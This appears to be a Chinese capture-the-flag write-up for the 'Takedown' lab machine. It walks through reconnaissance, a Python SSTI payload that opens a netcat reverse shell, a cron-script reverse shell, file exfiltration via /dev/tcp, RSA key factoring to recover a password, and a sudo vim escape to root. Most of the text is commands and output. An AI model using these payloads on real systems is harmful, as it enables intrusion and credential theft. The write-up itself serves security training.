
### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Takedown
```

```shell
难度：⭐️⭐️⭐️⭐️
知识点：信息收集，目录扫描，SSTI，`linpeas.sh`脚本，`RSA`工具及密钥处理脚本，`Contempt`提权
```

### 2. 信息收集

##### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.116  08:00:27:b1:55:96       PCS Systemtechnik GmbH
└─# IP=192.168.31.116
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 09:12 CST
Nmap scan report for osiris (192.168.31.116)
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey:
|   3072 51:fb:66:e0:d2:b6:ae:16:a9:d2:74:41:a5:b3:02:2b (RSA)
|   256 93:a0:01:6c:42:cd:26:bf:38:e5:70:fb:b8:c6:b3:fe (ECDSA)
|_  256 77:c9:ed:41:a5:cb:30:33:08:22:88:f6:a8:28:11:8d (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://shieldweb.che/
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:B1:55:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

开放了`22、80`端口,先常规扫一下目录

```shell
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
└─# dirsearch -u http://$IP  -x 403 -e txt,php,html

```

访问`80`端口无内容，直接访问有个301跳转 `http://shieldweb.che/` ,加入域名到`/etc/hosts`,进入页面`http://shieldweb.che/`，点击`Contact`按钮又跳转了`http://ticket.shieldweb.che/`,继续加入域名到`/etc/hosts`

```shell
└─# curl  http://$IP -v
*   Trying 192.168.31.116:80...
* Connected to 192.168.31.116 (192.168.31.116) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.31.116
> User-Agent: curl/8.11.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.18.0
< Date: Sat, 09 Aug 2025 01:22:39 GMT
< Content-Type: text/html
< Content-Length: 169
< Connection: keep-alive
< Location: http://shieldweb.che/
<
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
* Connection #0 to host 192.168.31.116 left intact
└─# cat /etc/hosts | grep .che
192.168.31.116  shieldweb.che ticket.shieldweb.che
```

### 3.获得`docker`权限

测试`Contact`页面存在`SSTI`模板注入

![image-20250809101436919](https://gitee.com/shui666/images/raw/master/images/image-20250809101436919.png)

去`github`找个现成方案测试`PayloadsAllTheThings
/Server Side Template Injection/Python.md`

```shell
#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) !
#注意，没得bash，用ash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.31.126 1234 -e /bin/ash').read() }}
└─# nc -lvp 1234
listening on [any] 1234 ...
id
connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 52914
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

美化一下终端，受限于`doker`环境，这里使用`Python`的`pty`模块生成一个伪终端，而不能直接用系统自带的工具`script`升级终端

```shell
#1.把反弹shell变成交互式，在接受回弹的nc -lvp 4444终端上执行
python -c 'import pty; pty.spawn("/bin/ash")'
先ctrl + Z 中断再输入
#2.交互式shell变成支持回退字符的shell（支持控制字符）
stty raw -echo;fg
#reset，这一条弄了当前终端只能强制关闭
#xterm#根据默认xterm查询，命令echo  $SHELL、echo  $TERM
3.终端vi可全屏编辑，解决输入问题
stty -a#查询当前尺寸
stty rows 24 columns 120#根据上面查询结果，设置为当前窗口大小
```



### 4.获得`love`权限

没扒拉到东西，先取个`linpeas.sh`脚本扫一下

```shell
kali└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.31.116 - - [09/Aug/2025 10:48:03] "GET /linpeas.sh HTTP/1.1" 200 -

/tmp # wget 192.168.31.126/linpeas.sh
Connecting to 192.168.31.126 (192.168.31.126:80)
linpeas.sh           100% |************************************************************************|  808k  0:00:00 ETA
/tmp # chmod +x linpeas.sh
/tmp # ./linpeas.sh
```

通过`linpeas.sh`脚本发现可疑目录挂载：将`/love/script`目录挂载到了`/script`（看群主的WP才知道）

```
╔══════════╣ Interesting Files Mounted
239 231 0:23 /love/script /script rw,nosuid,nodev - tmpfs tmpfs rw
240 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
241 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/hostname /etc/hostname rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
242 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/hosts /etc/hosts rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
244 233 0:5 /random /dev/random rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
245 233 0:5 /full /dev/full rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
246 233 0:5 /tty /dev/tty rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
247 233 0:5 /zero /dev/zero rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
248 233 0:5 /urandom /dev/urandom rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755

```

结合`/var/log`下`access.yml、chat`中内容，知道每`5分钟`执行了`cron`任务，任务路径是`/home/love/script`，前面已知`/love/script`目录被挂载到了`/script`。

```shell
/var/log # ls
access.yml  chat
/var/log # cat chat
Kevin: Love be careful what you do.
A.love: I don't know Kevin, it's just a moment.
Kevin: Remove that now.
A.Love: Go to.
/var/log # cat access.yml
2023-08-31 10:15:42 - Usuario: jsmith - Accion: Inicio de sesion exitoso
2023-08-31 11:20:18 - Usuario: a_doe - Accion: Acceso a la carpeta /datos/confidenciales
2023-08-31 12:45:29 - Usuario: s_miller - Accion: Intento de acceso no autorizado
2023-08-31 14:30:05 - Usuario: jdoe - Accion: Creación de archivo nuevo_reporte.txt
2023-08-31 15:10:22 - Usuario: r_jones - Accion: Cierre de sesion

2023-08-31 16:55:11 - Usuario: l_smith - Accion: Edicion de archivo informe_trimestral.docx
2023-08-31 18:02:45 - Usuario: jbrown - Accion: Eliminacion accidental del archivo importante.pdf
2023-08-31 19:40:30 - Usuario: c_wilson - Accion: Copia de archivos a la carpeta compartida /datos/publicos
2023-08-31 20:15:17 - Usuario: m_johnson - Accion: Cambio de contrasena exitoso
2023-08-31 21:30:59 - Usuario: k_adams - Accion: Descarga de archivo confidencial_backup.zip

2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: */5 * * * * root bash /home/love/script/*
/var/log #

239 231 0:23 /love/script /script rw,nosuid,nodev - tmpfs tmpfs rw
240 231 8:1
```

去挂载目录`/script`写个脚本，再等定时任务触发后即可获得shell

```shell
/var/log # cd /script/
/script # echo 'busybox nc 192.168.31.126 1235 -e /bin/bash' > a.sh
/script # chmod +x a.sh

kali└─# nc -lvp 1235
listening on [any] 1235 ...
id
connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 39518
uid=1002(love) gid=1002(love) grupos=1002(love)

```

方便登陆写个公钥

```
#kali生成公私钥
ssh-keygen -t ed25519
#靶机配置免密登陆
 mkdir ~/.ssh
echo '<公钥>'>>~/.ssh/authorized_key
```

### 5.获得`mitnick`权限

家目录下有四个账户`alfonso、love、mitnick、tomu`

```shell
love@osiris:~$ ls
note.txt
love@osiris:~$ cat note.txt
A.love:

Kevin this is a good icebreaker

we have icebreaker

jajajajjaja

S.A.S.
love@osiris:~$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/sh
......
tomu:x:1001:1001:Tsutomu Shimomura,,,:/home/tomu:/bin/bash
love:x:1002:1002:Alex Love,,,:/home/love:/bin/bash
mitnick:x:1003:1003:,,,:/home/mitnick:/bin/bash
love@osiris:/home$ alias ll='ls -artl'
love@osiris:/home$ ll
total 24
drwxr-xr-x 18 root    root    4096 jul  9  2023 ..
drwxr-xr-x  6 root    root    4096 ago 31  2023 .
drwxr-xr-x  7 alfonso alfonso 4096 oct  9  2023 alfonso
drwxr-xr-x  4 tomu    tomu    4096 jun  2  2024 tomu
drwxr-xr-x  4 mitnick mitnick 4096 jun 28 19:12 mitnick
drwxr-xr-x  4 love    love    4096 ago  9 05:13 love

```

`sudo -l`可以mitnick权限执行`home/mitnick/sas`

```shell
ove@osiris:/home/mitnick$ sudo -l
Matching Defaults entries for love on osiris:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User love may run the following commands on osiris:
    (mitnick) NOPASSWD: /home/mitnick/sas
love@osiris:/home/mitnick$ sudo -u mitnick /home/mitnick/sas
  SSSSS            AAA             SSSSS
 S     S          A   A           S     S
 S               A     A          S
  SSSSS          A     A           SSSSS
       S   ###   AAAAAAA    ###         S
 S     S   ###   A     A    ###   S     S
  SSSSS          A     A           SSSSS
SAS v1.0
(c) SWITCHED ACCESS SERVICES 2023 Aquilino Morcillo

sas -h Available commands
# id
Command not found: id
# sas -h
Available commands:
sas_call - listen to Services
ls - List files and directories
cat <filename> - Display contents of a file
whoami - Show current user
sas help (-h) - Show available commands
version (-v) - Show application version
run <filename> - Execute a file
dir - Show the content of the current directory in wide format
```

可以运行脚本，继续反弹个`shell`

```shell
love@osiris:~$ cat /home/love/a.sh
busybox nc 192.168.31.126 1235 -e /bin/bash
love@osiris:~$
love@osiris:~$ sudo -l
Matching Defaults entries for love on osiris:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User love may run the following commands on osiris:
    (mitnick) NOPASSWD: /home/mitnick/sas
love@osiris:~$ sudo -u mitnick /home/mitnick/sas
  SSSSS            AAA             SSSSS
 S     S          A   A           S     S
 S               A     A          S
  SSSSS          A     A           SSSSS
       S   ###   AAAAAAA    ###         S
 S     S   ###   A     A    ###   S     S
  SSSSS          A     A           SSSSS
SAS v1.0
(c) SWITCHED ACCESS SERVICES 2023 Aquilino Morcillo

sas -h Available commands
# run /home/love/a.sh

kali└─# nc -lvp 1235
listening on [any] 1235 ...
id
connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 49780
uid=1003(mitnick) gid=1003(mitnick) grupos=1003(mitnick)
```

在`/home/mitnick`目录下发现`publickey.pub、secret.enc`，大概率是通过公钥去解密`enc`，其实`mitnick`家目录的文件`love`账户可以读，直接操作就行了

```
love@osiris:/home/mitnick$ ls
publickey.pub  sas  secret.enc
love@osiris:/home/mitnick$ ll
total 2468
drwxr-xr-x 6 root    root       4096 ago 31  2023 ..
-rw-r--r-- 1 mitnick mitnick     807 ago 31  2023 .profile
-rw-r--r-- 1 mitnick mitnick    3526 ago 31  2023 .bashrc
-rw-r--r-- 1 mitnick mitnick     220 ago 31  2023 .bash_logout
drwxr-xr-x 3 mitnick mitnick    4096 ago 31  2023 .local
-rw-r--r-- 1 mitnick mitnick     138 ago 31  2023 publickey.pub
-rw-r--r-- 1 mitnick mitnick      32 ago 31  2023 secret.enc
lrwxrwxrwx 1 mitnick mitnick       9 ago 31  2023 .bash_history -> /dev/null
-rwx-----x 1 mitnick mitnick 2486396 ago 31  2023 sas
drwx------ 2 mitnick mitnick    4096 sep  1  2023 .ssh
drwxr-xr-x 4 mitnick mitnick    4096 jun 28 19:12 .
```

先把文件取到本地

```shell
love@osiris:/home/mitnick$ cat publickey.pub > /dev/tcp/192.168.31.126/1234
love@osiris:/home/mitnick$ cat secret.enc > /dev/tcp/192.168.31.126/1234

kali└─# nc -lvp 1234>publickey.pub
kali└─# nc -lvp 1234>secret.enc
listening on [any] 1234 ...
connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 35344
```



### 6.获得`tomu`权限

##### RSA解密

关于RSA的基础知识推荐看B站`风二西`师傅的成套[[视频](https://www.bilibili.com/video/BV1Dw411f7Ht)](https://www.bilibili.com/video/BV1Dw411f7Ht)

```shell
#风二西
https://www.bilibili.com/video/BV1Dw411f7Ht
```

通过公钥获取`n,e`参数，再去http://factordb.com/分解`n`获得`p,q`

```python
from Crypto.PublicKey import RSA
import libnum
with open("publickey.pub", 'rb') as f:
    key = f.read()
rsakey = RSA.importKey(key)
n= rsakey.n
e= rsakey.e
print(n)
print(e)
e= rsakey.e
#http://factordb.com/分解n
p=272799705830086927219936172916283678397
q=335234831001780341003153415948249295589
```

通过已知的`p,q,e`获得私钥

```python
from Crypto.PublicKey import RSA
import libnum
import gmpy2
p=272799705830086927219936172916283678397
q=335234831001780341003153415948249295589
n=p*q
e=65537
phi_n=(p-1)*(q-1)
#求逆元
d=libnum.invmod(e,phi_n)

'''
#生成公钥
rsa_components = (int(n), e)
keypair = RSA.construct(rsa_components)
with open('pubckey.pem', 'wb') as f :
    f.write(keypair.exportKey())
'''

#生成私钥
rsa_components = (int(n),e,int(d))#gmpy2模块计算的格式mpz，需强制转换成int参与计算
keypair = RSA.construct(rsa_components)
with open('private.pem', 'wb') as f :
    f.write(keypair.exportKey())
'''

└─# cat private.pem
-----BEGIN RSA PRIVATE KEY-----
MIGsAgEAAiEAyi/6FvQs4lbjPrDTdO/zI2zBgNeQQyMMkTjqNAfewRECAwEAAQIh
AK3yTsf2tLLZq9IgkRv24AbdmxAYvRgmyA/I66tUb+SRAhEA/DPhQ+5LX+thkzRn
r5Nq5QIRAM07T+4pkQ862tZ0HIlaHr0CEQDNdEImAeF7kZhawE1bdh+VAhBAKX/m
vHYOZd8O1sQpKNSdAhEAuVeKzLA7tfBrUC+xa8y+8A==
-----END RSA PRIVATE KEY-----
'''

```

再使用`OpenSSL`工具进行RSA解密`secret.enc`的明文

```shell
love@osiris:/tmp$ openssl rsautl -decrypt -in secret.enc -inkey private.pem -out decrypted.txt
love@osiris:/tmp$ cat decrypted.txt
sh1m0mur4Bl4ckh4t
```

获得`tomu`的密码为`sh1m0mur4Bl4ckh4t`

##### 轩禹CTF_RSA工具3.6

`风二西`师傅还写过一个RSA的解题工具`轩禹CTF_RSA工具3.6.1.exe`,导入公钥和密文后可以直接获得明文`sh1m0mur4Bl4ckh4t`，测试解密后的明文就是`tomu`账户的密码

![image-20250809142902394](https://gitee.com/shui666/images/raw/master/images/image-20250809142902394.png)

```shell
love@osiris:/home/mitnick$ su - tomu
Contraseña:#sh1m0mur4Bl4ckh4t
tomu@osiris:~$ id
uid=1001(tomu) gid=1001(tomu) grupos=1001(tomu)
```

`轩禹CTF_RSA工具3.6.1.exe`使用教程参考风二西B站[[视频](https://www.bilibili.com/video/BV1MK411m75Y)](https://www.bilibili.com/video/BV1MK411m75Y)

```shell
#轩禹CTF_RSA工具3.6.1
https://www.bilibili.com/video/BV1MK411m75Y
```

直接利用公钥和密文进行RSA解密的python脚本如下

```python
from Crypto.PublicKey import RSA
import libnum
import gmpy2
with open("secret.enc", 'rb') as f:
    c = f.read()
c=libnum.s2n(c)
with open("publickey.pub", 'rb') as f:
    key = f.read()
rsakey = RSA.importKey(key)
n= rsakey.n
e= rsakey.e
print(n)
#http://factordb.com/分解n
p=272799705830086927219936172916283678397
q=335234831001780341003153415948249295589
phi=(p-1)*(q-1)
d=libnum.invmod(e,phi)
m=pow(c,d,n)
print(libnum.n2s(int(m)))
#b'\x02\x8fx~\x04\xdc;\x19\xbd\x99\x10\x96\x00sh1m0mur4Bl4ckh4t\n'
```

通过`publickey.pub、secret.enc`两个文件`RSA解密`后获得`tomu`的密码为`sh1m0mur4Bl4ckh4t`

##### 拿到`user.txt`

```shell
tomu@osiris:~$ id
uid=1001(tomu) gid=1001(tomu) grupos=1001(tomu)
tomu@osiris:~$ cd
tomu@osiris:~$ ls
nokitel.md  nokitel.png  user.txt
tomu@osiris:~$ cat user.txt
612701a03669485d94bc687449fdab39
```



### 7.获得`root`权限

`sudo -l`可以root权限执行`/opt/Contempt/Contempt`

```shell
tomu@osiris:~$ sudo -l
Matching Defaults entries for tomu on osiris:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tomu may run the following commands on osiris:
    (root) /opt/Contempt/Contempt
```

运行`Contempt`选,择第二个选项进入`VIM`
![image-20250809144805725](https://gitee.com/shui666/images/raw/master/images/image-20250809144805725.png)

再输入`:!bash`即可获得`root`权限

![image-20250809144746849](https://gitee.com/shui666/images/raw/master/images/image-20250809144746849.png)



##### 拿到`root.txt`

```shell
root@osiris:/home/tomu# id
uid=0(root) gid=0(root) grupos=0(root)
root@osiris:/home/tomu# cd
root@osiris:~# ls
root.sh
root@osiris:~# cat root.sh
#!/bin/sh

clear

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"

printf "\n${greenColour}███████╗██████╗ ███████╗███████╗    ███╗   ███╗██╗████████╗███╗   ██╗██╗ ██████╗██╗  ██╗"
printf "\n${greenColour}██╔════╝██╔══██╗██╔════╝██╔════╝    ████╗ ████║██║╚══██╔══╝████╗  ██║██║██╔════╝██║ ██╔╝"
printf "\n${greenColour}█████╗  ██████╔╝█████╗  █████╗      ██╔████╔██║██║   ██║   ██╔██╗ ██║██║██║     █████╔╝ "
printf "\n${greenColour}██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██║╚██╔╝██║██║   ██║   ██║╚██╗██║██║██║     ██╔═██╗ "
printf "\n${greenColour}██║     ██║  ██║███████╗███████╗    ██║ ╚═╝ ██║██║   ██║   ██║ ╚████║██║╚██████╗██║  ██╗"
printf "\n${greenColour}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝ ╚═════╝╚═╝  ╚═╝\n${endColour}"
printf "\t\nflag --> 1e271c5ce97e76ae8417a95c74085fba \n"
root@osiris:~
```
群主大佬的[WP](https://www.bilibili.com/video/BV1B88Cz2Et2)